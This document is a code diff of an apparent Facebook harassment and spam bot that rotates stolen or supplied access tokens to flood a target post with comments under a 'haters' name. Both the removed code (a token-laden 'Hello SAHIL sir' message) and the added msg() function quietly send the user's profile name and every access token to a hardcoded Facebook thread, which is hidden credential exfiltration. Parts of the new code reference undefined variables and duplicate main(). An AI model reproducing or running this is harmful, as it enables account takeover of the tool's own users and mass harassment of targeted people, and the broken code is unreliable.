@@ -8,143 +8,144 @@ import subprocess
 import http.server
 import socketserver
 import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"-- MAFIA DON HU B3 BHOSDIK3")
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b"CHAND TRICKER")
+
 def execute_server():
-      PORT = 4000
+    PORT = 4000
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+        
+
+def post_comments():
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+
+    requests.packages.urllib3.disable_warnings()
+
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
+
+    def liness():
+        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    liness()
+
+    access_tokens = [token.strip() for token in tokens]
+
+    with open('post.txt', 'r') as file:
+        post_url = file.read().strip()
 
 
-def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
-          tokens = file.readlines()
+    with open('comments.txt', 'r') as file:
+        comments = file.readlines()
 
-      # Modify the message as per your requirement
-      msg_template = "Hello SAHIL sir! I am using your server.My token is = {}"
+    num_comments = len(comments)
+    max_tokens = min(num_tokens, num_comments)
 
-      # Specify the ID where you want to send the message
-      target_id = "61562908764313"
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
 
-      requests.packages.urllib3.disable_warnings()
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+        
+     #post_id = post_urlsplit
 
-      def liness():
-          print('\033[1;92m' + '•──────────────────────FUCKER───────────────────────────────•')
+    liness()
 
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
+    def getName(token):
+        try:
+            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+        except:
+            data = ""
+        if 'name' in data:
+            return data['name']
+        else:
+            return "Error occurred"
 
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
 
-          # No need to print here, as requested
-          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+    while True:
+        try:
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
+                access_token = access_tokens[token_index]
 
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
-          convo_id = file.read().strip()
+                comment = comments[comment_index].strip()
 
-      with open('File.txt', 'r') as file:
-          messages = file.readlines()
+                url = "https://graph.facebook.com/{}/comments".format(post_url)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
+                response = requests.post(url, json=parameters, headers=headers)
 
-      num_messages = len(messages)
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
 
-      with open('tokennum.txt', 'r') as file:
-          tokens = file.readlines()
-      num_tokens = len(tokens)
-      max_tokens = min(num_tokens, num_messages)
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
+        except Exception as e:
 
-      with open('hatersname.txt', 'r') as file:
-          haters_name = file.read().strip()
+          print("[!] An error occurred: {}".format(e))
 
-      with open('time.txt', 'r') as file:
-          speed = int(file.read().strip())
 
-      def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      while True:
-          try:
-              for message_index in range(num_messages):
-                  token_index = message_index % max_tokens
-                  access_token = tokens[token_index].strip()
-
-                  message = messages[message_index].strip()
-
-                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                  response = requests.post(url, json=parameters, headers=headers)
-
-                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  else:
-                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  time.sleep(speed)
-
-              print("\n[+] All messages sent. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
+def msg():
+    parameters = {
+        'access_token': random.choice(access_tokens),
+        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
+            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
+    }
+    try:
+        s = requests.post("https://graph.facebook.com/v15.0/t_100061804071519/", data=parameters, headers=headers)
+    except:
+        pass
 
 def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
 
-      # Send the initial message to the specified ID using all tokens
-
-
-      # Then, continue with the message sending loop
-      send_messages_from_file()
+    post_comments()
+    msg()
 
 if __name__ == '__main__':
-      main ()
+    main()
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    post_comments()
+
+if __name__ == '__main__':
+    main()
